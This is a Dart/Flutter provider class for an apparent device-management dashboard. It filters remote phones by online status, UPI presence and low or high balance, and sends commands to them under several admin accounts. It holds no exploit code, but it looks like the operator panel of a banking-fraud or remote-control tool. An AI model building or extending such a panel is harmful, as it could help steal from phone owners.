import 'package:flutter/foundation.dart';
import 'dart:async';
import '../../data/models/device.dart';
import '../../data/models/stats.dart';
import '../../data/models/app_type.dart';
import '../../data/repositories/device_repository.dart';

// 🔥 دسته‌بندی فیلترها
enum StatusFilter { active, pending }
enum ConnectionFilter { online, offline }
enum UpiFilter { withUpi, withoutUpi }
enum NotePriorityFilter { lowBalance, highBalance, none }  // 👈 جدید

class DeviceProvider extends ChangeNotifier {
  final DeviceRepository _deviceRepository = DeviceRepository();

  List<Device> _devices = [];
  Stats? _stats;
  AppTypesResponse? _appTypes;
  bool _isLoading = false;
  String? _errorMessage;

  // 🔥 فیلترهای دسته‌بندی شده (هر کدوم null یعنی فیلتر نشده)
  StatusFilter? _statusFilter;
  ConnectionFilter? _connectionFilter;
  UpiFilter? _upiFilter;
  NotePriorityFilter? _notePriorityFilter;  // 👈 جدید
  String? _appTypeFilter;  // 👈 جدید
  String? _adminFilter;  // 👈 فیلتر ادمین (فقط برای سوپرادمین)
  String _searchQuery = '';

  // Pagination
  int _currentPage = 1;
  int _pageSize = 50;
  int _totalDevicesCount = 0;

  // Auto-Refresh
  Timer? _autoRefreshTimer;
  bool _autoRefreshEnabled = false;
  int _autoRefreshInterval = 30;

  // Getters
  List<Device> get devices => _filteredDevices;
  Stats? get stats => _stats;
  AppTypesResponse? get appTypes => _appTypes;
  bool get isLoading => _isLoading;
  String? get errorMessage => _errorMessage;
  StatusFilter? get statusFilter => _statusFilter;
  ConnectionFilter? get connectionFilter => _connectionFilter;
  UpiFilter? get upiFilter => _upiFilter;
  NotePriorityFilter? get notePriorityFilter => _notePriorityFilter;  // 👈 جدید
  String? get appTypeFilter => _appTypeFilter;  // 👈 جدید
  String? get adminFilter => _adminFilter;  // 👈 جدید
  String get searchQuery => _searchQuery;
  int get totalDevicesCount => _totalDevicesCount;
  int get currentPage => _currentPage;
  int get pageSize => _pageSize;
  int get totalPages => (_totalDevicesCount / _pageSize).ceil();
  bool get hasNextPage => _currentPage < totalPages;
  bool get hasPreviousPage => _currentPage > 1;
  bool get autoRefreshEnabled => _autoRefreshEnabled;
  int get autoRefreshInterval => _autoRefreshInterval;

  // 🔥 لاجیک فیلتر ترکیبی
  List<Device> get _filteredDevices {
    var filtered = _devices;

    // فیلتر وضعیت (Active/Pending)
    if (_statusFilter != null) {
      switch (_statusFilter!) {
        case StatusFilter.active:
          filtered = filtered.where((d) => d.isActive).toList();
          break;
        case StatusFilter.pending:
          filtered = filtered.where((d) => d.isPending).toList();
          break;
      }
    }

    // فیلتر اتصال (Online/Offline)
    if (_connectionFilter != null) {
      switch (_connectionFilter!) {
        case ConnectionFilter.online:
          filtered = filtered.where((d) => d.isOnline).toList();
          break;
        case ConnectionFilter.offline:
          filtered = filtered.where((d) => d.isOffline).toList();
          break;
      }
    }

    // فیلتر UPI
    if (_upiFilter != null) {
      switch (_upiFilter!) {
        case UpiFilter.withUpi:
          filtered = filtered.where((d) => d.hasUpi).toList();
          break;
        case UpiFilter.withoutUpi:
          filtered = filtered.where((d) => !d.hasUpi).toList();
          break;
      }
    }

    // 👇 فیلتر Note Priority (جدید)
    if (_notePriorityFilter != null) {
      switch (_notePriorityFilter!) {
        case NotePriorityFilter.lowBalance:
          filtered = filtered.where((d) => d.notePriority == 'lowbalance').toList();
          break;
        case NotePriorityFilter.highBalance:
          filtered = filtered.where((d) => d.notePriority == 'highbalance').toList();
          break;
        case NotePriorityFilter.none:
          filtered = filtered.where((d) => d.notePriority == null || d.notePriority == 'none').toList();
          break;
      }
    }

    // جستجو
    if (_searchQuery.isNotEmpty) {
      filtered = filtered.where((device) {
        final query = _searchQuery.toLowerCase();
        return device.deviceId.toLowerCase().contains(query) ||
            device.model.toLowerCase().contains(query) ||
            device.manufacturer.toLowerCase().contains(query);
      }).toList();
    }

    return filtered;
  }

  // آمار کلی (از همه دستگاه‌ها)
  int get totalDevices => _devices.length;
  int get activeDevices => _devices.where((d) => d.isActive).length;
  int get pendingDevices => _devices.where((d) => d.isPending).length;
  int get onlineDevices => _devices.where((d) => d.isOnline).length;
  int get offlineDevices => _devices.where((d) => d.isOffline).length;
  int get devicesWithUpi => _devices.where((d) => d.hasUpi).length;
  int get devicesWithoutUpi => _devices.where((d) => !d.hasUpi).length;

  // 👇 آمار Note Priority (جدید)
  int get devicesLowBalance => _devices.where((d) => d.notePriority == 'lowbalance').length;
  int get devicesHighBalance => _devices.where((d) => d.notePriority == 'highbalance').length;
  int get devicesNoPriority => _devices.where((d) => d.notePriority == null || d.notePriority == 'none').length;

  // 🔥 تنظیم فیلترها
  void setStatusFilter(StatusFilter? filter) {
    if (_statusFilter == filter) {
      _statusFilter = null; // toggle off
    } else {
      _statusFilter = filter;
    }
    notifyListeners();
  }

  void setConnectionFilter(ConnectionFilter? filter) {
    if (_connectionFilter == filter) {
      _connectionFilter = null; // toggle off
    } else {
      _connectionFilter = filter;
    }
    notifyListeners();
  }

  void setUpiFilter(UpiFilter? filter) {
    if (_upiFilter == filter) {
      _upiFilter = null; // toggle off
    } else {
      _upiFilter = filter;
    }
    notifyListeners();
  }

  // 👇 تنظیم فیلتر Note Priority (جدید)
  void setNotePriorityFilter(NotePriorityFilter? filter) {
    if (_notePriorityFilter == filter) {
      _notePriorityFilter = null; // toggle off
    } else {
      _notePriorityFilter = filter;
    }
    _currentPage = 1;
    _loadCurrentPage();
  }
  
  // 👇 تنظیم فیلتر App Type (جدید)
  void setAppTypeFilter(String? appType) {
    if (_appTypeFilter == appType) {
      _appTypeFilter = null; // toggle off
    } else {
      _appTypeFilter = appType;
    }
    _currentPage = 1;
    _loadCurrentPage();
  }

  void setAdminFilter(String? adminUsername) {
    final oldFilter = _adminFilter;
    
    // Set the filter value
    // null = my devices (current admin)
    // "all" = all admins' devices
    // username = specific admin's devices
    _adminFilter = adminUsername;
    
    // وقتی فیلتر عوض میشه، app type filter رو پاک کن
    // چون ممکنه app type های مختلف از ادمین های مختلف باشه
    if (oldFilter != _adminFilter && _appTypeFilter != null) {
      _appTypeFilter = null;
    }
    
    _currentPage = 1;
    _loadCurrentPage();
  }

  void clearAllFilters() {
    _statusFilter = null;
    _connectionFilter = null;
    _upiFilter = null;
    _notePriorityFilter = null;  // 👈 جدید
    _appTypeFilter = null;  // 👈 جدید
    notifyListeners();
  }

  void setSearchQuery(String query) {
    _searchQuery = query;
    notifyListeners();
  }

  void clearSearch() {
    _searchQuery = '';
    notifyListeners();
  }

  // لود app types
  Future<void> fetchAppTypes() async {
    try {
      _appTypes = await _deviceRepository.getAppTypes();
      notifyListeners();
    } catch (e) {
      debugPrint('❌ Error fetching app types: $e');
    }
  }

  // لود اولیه
  Future<void> fetchDevices() async {
    _currentPage = 1;
    // Fetch app types (non-blocking, errors are caught inside)
    fetchAppTypes();
    await _loadCurrentPage();
  }

  Future<void> refreshSingleDevice(String deviceId) async {
    try {
      debugPrint('🔄 Refreshing device: $deviceId');
      final updatedDevice = await _deviceRepository.getDevice(deviceId);
      if (updatedDevice != null) {
        final index = _devices.indexWhere((d) => d.deviceId == deviceId);
        if (index != -1) {
          _devices[index] = updatedDevice;
          debugPrint('✅ Device updated - Note: ${updatedDevice.noteMessage}, Priority: ${updatedDevice.notePriority}');
          notifyListeners();
        } else {
          debugPrint('⚠️ Device not found in list: $deviceId');
        }
      } else {
        debugPrint('⚠️ Updated device is null');
      }
    } catch (e) {
      debugPrint('❌ Refresh single device failed: $e');
    }
  }

  // لود صفحه فعلی
  Future<void> _loadCurrentPage() async {
    try {
      _isLoading = true;
      _errorMessage = null;
      notifyListeners();

      final skip = (_currentPage - 1) * _pageSize;

      final result = await _deviceRepository.getDevices(
        skip: skip,
        limit: _pageSize,
        appType: _appTypeFilter,
        adminUsername: _adminFilter,
      );

      _devices = result['devices'];
      _totalDevicesCount = result['total'];
      _stats = await _deviceRepository.getStats();
      
      // Refresh app types to get updated counts (non-blocking)
      fetchAppTypes();

      _isLoading = false;
      notifyListeners();
    } catch (e) {
      _isLoading = false;
      _errorMessage = 'Error fetching devices list';
      debugPrint('❌ Error in _loadCurrentPage: $e');
      notifyListeners();
    }
  }

  Future<void> setPageSize(int size) async {
    if (size == _pageSize) return;
    _pageSize = size;
    _currentPage = 1;
    await _loadCurrentPage();
  }

  Future<void> goToNextPage() async {
    if (!hasNextPage) return;
    _currentPage++;
    await _loadCurrentPage();
  }

  Future<void> goToPreviousPage() async {
    if (!hasPreviousPage) return;
    _currentPage--;
    await _loadCurrentPage();
  }

  Future<void> goToPage(int page) async {
    if (page < 1 || page > totalPages) return;
    _currentPage = page;
    await _loadCurrentPage();
  }

  Future<void> refreshDevices() async {
    await _loadCurrentPage();
  }


  // Auto-Refresh
  void enableAutoRefresh({int intervalSeconds = 30}) {
    _autoRefreshInterval = intervalSeconds;
    _autoRefreshEnabled = true;
    _autoRefreshTimer?.cancel();
    _autoRefreshTimer = Timer.periodic(
      Duration(seconds: intervalSeconds),
          (timer) {
        if (!_isLoading) {
          _silentRefresh();
        }
      },
    );
    notifyListeners();
  }




  void disableAutoRefresh() {
    _autoRefreshEnabled = false;
    _autoRefreshTimer?.cancel();
    _autoRefreshTimer = null;
    notifyListeners();
  }

  void setAutoRefreshInterval(int seconds) {
    if (seconds < 10) seconds = 10;
    _autoRefreshInterval = seconds;
    if (_autoRefreshEnabled) {
      enableAutoRefresh(intervalSeconds: seconds);
    }
  }

  Future<void> _silentRefresh() async {
    try {
      final skip = (_currentPage - 1) * _pageSize;
      debugPrint('🔄 Auto-refresh: Page $_currentPage');

      final result = await _deviceRepository.getDevices(
        skip: skip,
        limit: _pageSize,
        appType: _appTypeFilter,
        adminUsername: _adminFilter,
      );

      _devices = result['devices'];
      _totalDevicesCount = result['total'];
      _stats = await _deviceRepository.getStats();
      
      // Refresh app types to get updated counts (non-blocking)
      fetchAppTypes();

      notifyListeners();
      debugPrint('✅ Auto-refresh completed: ${_devices.length} devices');
    } catch (e) {
      debugPrint('❌ Auto-refresh error: $e');
    }
  }

  Future<Device?> getDevice(String deviceId) async {
    try {
      return await _deviceRepository.getDevice(deviceId);
    } catch (e) {
      _errorMessage = 'Error fetching device information';
      notifyListeners();
      return null;
    }
  }

  Future<bool> sendCommand(String deviceId, String command, {Map<String, dynamic>? parameters}) async {
    try {
      return await _deviceRepository.sendCommand(deviceId, command, parameters: parameters);
    } catch (e) {
      _errorMessage = 'Error sending command';
      notifyListeners();
      return false;
    }
  }

  Future<bool> updateDeviceSettings(String deviceId, DeviceSettings settings) async {
    try {
      return await _deviceRepository.updateSettings(deviceId, settings);
    } catch (e) {
      _errorMessage = 'Error updating settings';
      notifyListeners();
      return false;
    }
  }

  void clearError() {
    _errorMessage = null;
    notifyListeners();
  }


  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    super.dispose();
  }
}